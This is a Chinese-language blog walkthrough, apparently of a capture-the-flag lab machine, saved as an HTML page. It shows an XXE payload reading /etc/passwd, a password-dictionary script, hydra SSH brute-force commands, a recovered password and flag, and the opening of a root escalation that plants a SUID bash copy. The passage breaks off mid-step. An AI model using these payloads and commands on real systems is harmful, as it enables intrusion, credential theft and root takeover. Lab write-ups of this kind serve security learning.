@@ -1,0 +1,332 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="1.信息收集![[Pasted image 20260116215904.png]] 构造payload12345&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [      &lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&amp;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="zhaochoudecat">
+<meta property="og:url" content="https://zhaochoudecat.github.io/2026/01/16/QQGroup/112/112/index.html">
+<meta property="og:site_name" content="zhaochoudecat">
+<meta property="og:description" content="1.信息收集![[Pasted image 20260116215904.png]] 构造payload12345&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [      &lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&amp;">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2026-01-16T11:49:24.376Z">
+<meta property="article:modified_time" content="2026-01-17T05:38:20.424Z">
+<meta property="article:author" content="zhaochoudecat">
+<meta name="twitter:card" content="summary">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>zhaochoudecat</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+<body>
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="https://github.com/zhaochoudecat">Projects</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2026/01/19/QQGroup/113/113/"><i class="fa fa-chevron-left" aria-hidden="true" onmouseover='$("#i-prev").toggle();' onmouseout='$("#i-prev").toggle();'></i></a></li>
+        
+        
+        <li><a class="icon" href="/2026/01/14/QQGroup/Meta/Meta/"><i class="fa fa-chevron-right" aria-hidden="true" onmouseover='$("#i-next").toggle();' onmouseout='$("#i-next").toggle();'></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up" aria-hidden="true" onmouseover='$("#i-top").toggle();' onmouseout='$("#i-top").toggle();'></i></a></li>
+        <li><a class="icon" href="#"><i class="fa fa-share-alt" aria-hidden="true" onmouseover='$("#i-share").toggle();' onmouseout='$("#i-share").toggle();' onclick='$("#share").toggle();return false;'></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://zhaochoudecat.github.io/2026/01/16/QQGroup/112/112/"><i class="fa fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://zhaochoudecat.github.io/2026/01/16/QQGroup/112/112/&text="><i class="fa fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://zhaochoudecat.github.io/2026/01/16/QQGroup/112/112/&title="><i class="fa fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://zhaochoudecat.github.io/2026/01/16/QQGroup/112/112/&is_video=false&description="><i class="fa fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=&body=Check out this article: https://zhaochoudecat.github.io/2026/01/16/QQGroup/112/112/"><i class="fa fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://zhaochoudecat.github.io/2026/01/16/QQGroup/112/112/&title="><i class="fa fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://zhaochoudecat.github.io/2026/01/16/QQGroup/112/112/&title="><i class="fa fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://zhaochoudecat.github.io/2026/01/16/QQGroup/112/112/&title="><i class="fa fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://zhaochoudecat.github.io/2026/01/16/QQGroup/112/112/&title="><i class="fa fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://zhaochoudecat.github.io/2026/01/16/QQGroup/112/112/&name=&description="><i class="fa fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text">1.信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%84%E9%80%A0payload"><span class="toc-number">1.1.</span> <span class="toc-text">构造payload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%84%E9%80%A0%E5%8E%9F%E7%90%86"><span class="toc-number">1.2.</span> <span class="toc-text">构造原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-DTD-%E5%AE%9A%E4%B9%89%E9%83%A8%E5%88%86"><span class="toc-number">1.2.1.</span> <span class="toc-text">1. DTD 定义部分</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%81%B6%E6%84%8F%E5%AE%9E%E4%BD%93%E5%A3%B0%E6%98%8E"><span class="toc-number">1.2.2.</span> <span class="toc-text">2. 恶意实体声明</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%AE%9E%E4%BD%93%E5%BC%95%E7%94%A8%E9%83%A8%E5%88%86"><span class="toc-number">1.2.3.</span> <span class="toc-text">3. 实体引用部分</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-ssh"><span class="toc-number">2.</span> <span class="toc-text">2.ssh</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2-1-%E6%9E%84%E9%80%A0%E5%AD%97%E5%85%B8"><span class="toc-number">2.1.</span> <span class="toc-text">2.1 构造字典</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-2hydra%E7%88%86%E7%A0%B4"><span class="toc-number">2.2.</span> <span class="toc-text">2.2hydra爆破</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-%E6%8F%90%E6%9D%83"><span class="toc-number">3.</span> <span class="toc-text">3.提权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8Broot%E6%9D%83%E9%99%90%E7%9A%84%E6%96%87%E4%BB%B6"><span class="toc-number">3.1.</span> <span class="toc-text">查看root权限的文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="toc-number">3.2.</span> <span class="toc-text">漏洞利用思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%E6%AD%A5%E9%AA%A4"><span class="toc-number">3.3.</span> <span class="toc-text">提权步骤</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%A1%88%E4%B8%80"><span class="toc-number">3.3.1.</span> <span class="toc-text">方案一</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%A1%88%E4%BA%8C"><span class="toc-number">3.3.2.</span> <span class="toc-text">方案二</span></a></li></ol></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index width mx-auto px2 my4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">zhaochoudecat</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2026-01-16T11:49:24.376Z" itemprop="datePublished">2026-01-16</time>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h1><p>![[Pasted image 20260116215904.png]]</p>
+<h2 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">      &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;&amp;xxe;&lt;/root&gt;</span><br></pre></td></tr></table></figure>
+
+<p>“解释下XXE漏洞”点击查看元宝的回答<br><a target="_blank" rel="noopener" href="https://yb.tencent.com/s/uFBGuZGahpLg">https://yb.tencent.com/s/uFBGuZGahpLg</a></p>
+<h2 id="构造原理"><a href="#构造原理" class="headerlink" title="构造原理"></a>构造原理</h2><h3 id="1-DTD-定义部分"><a href="#1-DTD-定义部分" class="headerlink" title="1. DTD 定义部分"></a>1. DTD 定义部分</h3><ul>
+<li><code>&lt;!DOCTYPE root [ ... ]&gt;</code>: 定义了 XML 文档的类型，并允许在方括号 <code>[]</code> 内定义内部或外部实体。</li>
+</ul>
+<h3 id="2-恶意实体声明"><a href="#2-恶意实体声明" class="headerlink" title="2. 恶意实体声明"></a>2. 恶意实体声明</h3><ul>
+<li><p><code>&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;</code>:</p>
+<ul>
+<li><code>&lt;!ENTITY xxe ...&gt;</code>: 声明一个名为 <code>xxe</code> 的实体。</li>
+<li><code>SYSTEM</code>: 关键指令，指示解析器从外部资源获取数据。</li>
+<li><code>&quot;file:///etc/passwd&quot;</code>: 指定资源的路径。通过 <code>file://</code> 协议，攻击者可以访问服务器的文件系统。</li>
+<li><strong>动作</strong>: 解析器会读取 <code>/etc/passwd</code> 的内容并将其存储在 <code>xxe</code> 实体中。</li>
+</ul>
+</li>
+</ul>
+<h3 id="3-实体引用部分"><a href="#3-实体引用部分" class="headerlink" title="3. 实体引用部分"></a>3. 实体引用部分</h3><ul>
+<li><code>&amp;xxe;</code>: 在 XML 文档主体中引用该实体。</li>
+<li><strong>动作</strong>: 解析器在处理文档时，会将 <code>&amp;xxe;</code> 替换为实体的内容（即 <code>/etc/passwd</code> 的内容）。如果解析后的结果被返回给用户（如本项目中的 <code>print_r</code> 显示结果），文件内容就会泄露.</li>
+</ul>
+<blockquote>
+<p>[!NOTE] 总结<br>因为服务器端的 XML 解析器没有禁用外部实体加载功能，所以当它解析这段代码时，实际上执行了以下操作：<br>1.看到 SYSTEM 指令。<br>2.去读取 &#x2F;etc&#x2F;passwd。 把文件内容塞到 <code>&lt;root&gt;</code> 标签里。<br>3.最后 PHP 代码把解析后的 <code>&lt;root&gt;</code> 内容打印到了网页上，导致文件泄露</p>
+</blockquote>
+<p>页面结果</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">SimpleXMLElement Object</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">_apt:x:100:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin</span><br><span class="line">messagebus:x:104:110::/nonexistent:/usr/sbin/nologin</span><br><span class="line">sshd:x:105:65534::/run/sshd:/usr/sbin/nologin</span><br><span class="line">tuf:x:1000:1000:KQNPHFqG**JHcYJossIe:/home/tuf:/bin/bash</span><br><span class="line">mysql:x:106:113:MySQL Server,,,:/nonexistent:/bin/false</span><br><span class="line">Debian-snmp:x:107:114::/var/lib/snmp:/bin/false</span><br><span class="line">zabbix:x:108:115::/nonexistent:/usr/sbin/nologin</span><br><span class="line"></span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+<h1 id="2-ssh"><a href="#2-ssh" class="headerlink" title="2.ssh"></a>2.ssh</h1><p>发现<code>tuf:x:1000:1000:KQNPHFqG**JHcYJossIe:/home/tuf:/bin/bash</code> ，密码中间有两个<code>*</code>号，推测需要爆破</p>
+<h2 id="2-1-构造字典"><a href="#2-1-构造字典" class="headerlink" title="2.1 构造字典"></a>2.1 构造字典</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义掩码前后缀</span></span><br><span class="line">prefix = <span class="string">&quot;KQNPHFqG&quot;</span></span><br><span class="line">suffix = <span class="string">&quot;JHcYJossIe&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义所有可能的字符集 (数字 + 大小写字母 + 常见符号)</span></span><br><span class="line">chars = string.digits + string.ascii_letters + string.punctuation</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成所有 2 位字符的组合</span></span><br><span class="line">combinations = itertools.product(chars, repeat=<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打开文件准备写入</span></span><br><span class="line">output_file = os.path.join(os.path.dirname(__file__), <span class="string">&quot;pass_dict.txt&quot;</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">	<span class="keyword">for</span> combo <span class="keyword">in</span> combinations:</span><br><span class="line">		middle = <span class="string">&quot;&quot;</span>.join(combo)</span><br><span class="line">		password = <span class="string">f&quot;<span class="subst">&#123;prefix&#125;</span><span class="subst">&#123;middle&#125;</span><span class="subst">&#123;suffix&#125;</span>&quot;</span></span><br><span class="line">		f.write(password + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"><span class="comment"># Cn1 * Cn1 = Cn2，即平方</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;字典生成完毕，已保存到 <span class="subst">&#123;output_file&#125;</span>，共 <span class="subst">&#123;<span class="built_in">len</span>(chars)**<span class="number">2</span>&#125;</span> 个密码。&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><strong>运行结果：共 8836 个密码。</strong></p>
+<h2 id="2-2hydra爆破"><a href="#2-2hydra爆破" class="headerlink" title="2.2hydra爆破"></a>2.2hydra爆破</h2><p>将生成的字典 <code>pass_dict.txt</code> 上传至 Kali，并使用 <code>hydra</code> 进行 SSH 爆破。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 上传字典</span></span><br><span class="line">sshpass -p kali scp -o StrictHostKeyChecking=no pass_dict.txt root@192.168.3.48:/root/pass_dict.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 hydra 爆破</span></span><br><span class="line">sshpass -p kali ssh -o StrictHostKeyChecking=no root@192.168.3.48 <span class="string">&quot;hydra -l tuf -P /root/pass_dict.txt ssh://192.168.3.212 -t 16 -I&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>  用户: <code>tuf</code><br>  密码: <code>KQNPHFqG6mJHcYJossIe</code></p>
+<p>发现user.txt</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tuf@112:~$ <span class="built_in">cat</span> user.txt </span><br><span class="line">flag&#123;user-b1e12c74f19aac8e57f6fca1ff472905&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="3-提权"><a href="#3-提权" class="headerlink" title="3.提权"></a>3.提权</h1><h2 id="查看root权限的文件"><a href="#查看root权限的文件" class="headerlink" title="查看root权限的文件"></a>查看root权限的文件</h2><p>看下<code>sudo -l</code> 发现<code>/opt/112.sh</code>脚本</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">tuf@112:~$ <span class="built_in">sudo</span> -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> tuf on 112:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User tuf may run the following commands on 112:</span><br><span class="line">    (ALL) NOPASSWD: /opt/112.sh</span><br><span class="line">tuf@112:~$ <span class="built_in">ls</span> -l /opt/112.sh</span><br><span class="line">-rwxr-xr-x 1 root root 993 Jan  8 04:56 /opt/112.sh</span><br></pre></td></tr></table></figure>
+
+<p>看下内容</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">input_url=<span class="string">&quot;&quot;</span></span><br><span class="line">output_file=<span class="string">&quot;&quot;</span></span><br><span class="line">use_file=<span class="literal">false</span></span><br><span class="line"><span class="comment"># 定义正则表达式：必须以 https://maze-sec.com/ 开头，后续只能包含字母、数字和斜杠</span></span><br><span class="line">regex=<span class="string">&#x27;^https://maze-sec.com/[a-zA-Z0-9/]*$&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 getopts 解析命令行参数 (-u URL, -o 输出文件)</span></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">getopts</span> <span class="string">&quot;:u:o:&quot;</span> opt; <span class="keyword">do</span></span><br><span class="line">    <span class="keyword">case</span> <span class="variable">$&#123;opt&#125;</span> <span class="keyword">in</span></span><br><span class="line">        u) input_url=<span class="string">&quot;<span class="variable">$OPTARG</span>&quot;</span> ;;       <span class="comment"># 获取输入的 URL</span></span><br><span class="line">        o) output_file=<span class="string">&quot;<span class="variable">$OPTARG</span>&quot;</span>; use_file=<span class="literal">true</span> ;; <span class="comment"># 获取输出文件路径，并标记使用文件输出</span></span><br><span class="line">        \?) <span class="built_in">echo</span> <span class="string">&quot;错误: 无效选项 -<span class="variable">$OPTARG</span>&quot;</span>; <span class="built_in">exit</span> 1 ;; <span class="comment"># Corrected escape for backslash in case statement</span></span><br><span class="line">        :) <span class="built_in">echo</span> <span class="string">&quot;错误: 选项 -<span class="variable">$OPTARG</span> 需要一个参数&quot;</span>; <span class="built_in">exit</span> 1 ;; <span class="comment"># Corrected escape for backslash in case statement</span></span><br><span class="line">    <span class="keyword">esac</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查是否提供了 input_url</span></span><br><span class="line"><span class="keyword">if</span> [[ -z <span class="string">&quot;<span class="variable">$input_url</span>&quot;</span> ]]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;错误: 必须使用 -u 参数提供URL&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查 URL 格式：必须以指定域名开头</span></span><br><span class="line"><span class="keyword">if</span> [[ ! <span class="string">&quot;<span class="variable">$input_url</span>&quot;</span> =~ ^https://maze-sec.com/ ]]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;错误: URL必须以 https://maze-sec.com/ 开头&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查 URL 字符：必须符合 regex 定义的字符集（防止命令注入等，但允许路径字符）</span></span><br><span class="line"><span class="keyword">if</span> [[ ! <span class="string">&quot;<span class="variable">$input_url</span>&quot;</span> =~ <span class="variable">$regex</span> ]]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;错误: URL包含非法字符，只允许字母、数字和斜杠&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 随机决定输出结果是 &quot;good&quot; 还是 &quot;bad&quot;</span></span><br><span class="line"><span class="keyword">if</span> (( RANDOM % <span class="number">2</span> )); <span class="keyword">then</span></span><br><span class="line">    result=<span class="string">&quot;<span class="variable">$input_url</span> is a good url.&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    result=<span class="string">&quot;<span class="variable">$input_url</span> is not a good url.&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 漏洞点：如果指定了 -o，则将结果写入 output_file。</span></span><br><span class="line"><span class="comment"># 由于 script 以 root 权限运行，且未检查 output_file 的路径，攻击者可以覆盖系统任意文件。</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$use_file</span>&quot;</span> = <span class="literal">true</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$result</span>&quot;</span> &gt; <span class="string">&quot;<span class="variable">$output_file</span>&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;结果已保存到: <span class="variable">$output_file</span>&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$result</span>&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞利用思路"><a href="#漏洞利用思路" class="headerlink" title="漏洞利用思路"></a>漏洞利用思路</h2><p>&#x3D;&#x3D;覆盖脚本自身与相对路径执行&#x3D;&#x3D;</p>
+<p>虽然无法注入换行符或空格，但我们发现可以通过覆盖脚本 <code>/opt/112.sh</code> 自身来改变其行为。</p>
+<ol>
+<li><p><strong>构造 Payload</strong>：我们将 <code>/opt/112.sh</code> 里的内容覆盖为 <code>https://maze-sec.com/x is not a good url.</code>。</p>
+</li>
+<li><p><strong>触发执行</strong>：再次执行 <code>sudo /opt/112.sh</code> 时，Bash 会将第一行 <code>https://maze-sec.com/x</code> 解析为命令执行。</p>
+</li>
+<li><p><strong>路径欺骗</strong>：由于 <code>https://maze-sec.com/x</code> 包含斜杠，Bash 会将其视为路径。如果在当前目录下存在目录结构 <code>https:/maze-sec.com/</code> 且其中有可执行文件 <code>x</code>，它就会被执行。</p>
+<ul>
+<li>注意：在 Linux 中，路径 <code>https://maze-sec.com/x</code> 被解析为 <code>https:/</code> (目录) -&gt; <code>maze-sec.com/</code> (目录) -&gt; <code>x</code> (文件)。这实际上是一个相对路径。</li>
+</ul>
+</li>
+</ol>
+<h2 id="提权步骤"><a href="#提权步骤" class="headerlink" title="提权步骤"></a>提权步骤</h2><h3 id="方案一"><a href="#方案一" class="headerlink" title="方案一"></a>方案一</h3><ol>
+<li><strong>准备恶意脚本</strong>： 在 <code>/home/tuf</code> 下创建目录结构和 Payload 脚本（赋予 SUID 权限给 bash）：</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> -p https:/maze-sec.com/  </span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;#!/bin/bash  </span></span><br><span class="line"><span class="string">cp /bin/bash /tmp/bash  </span></span><br><span class="line"><span class="string">chmod +s /tmp/bash&#x27;</span> &gt; https:/maze-sec.com/x  </span><br><span class="line"><span class="built_in">chmod</span> +x https:/maze-sec.com/x </span><br></pre></td></tr></table></figure>
+<ol start="2">
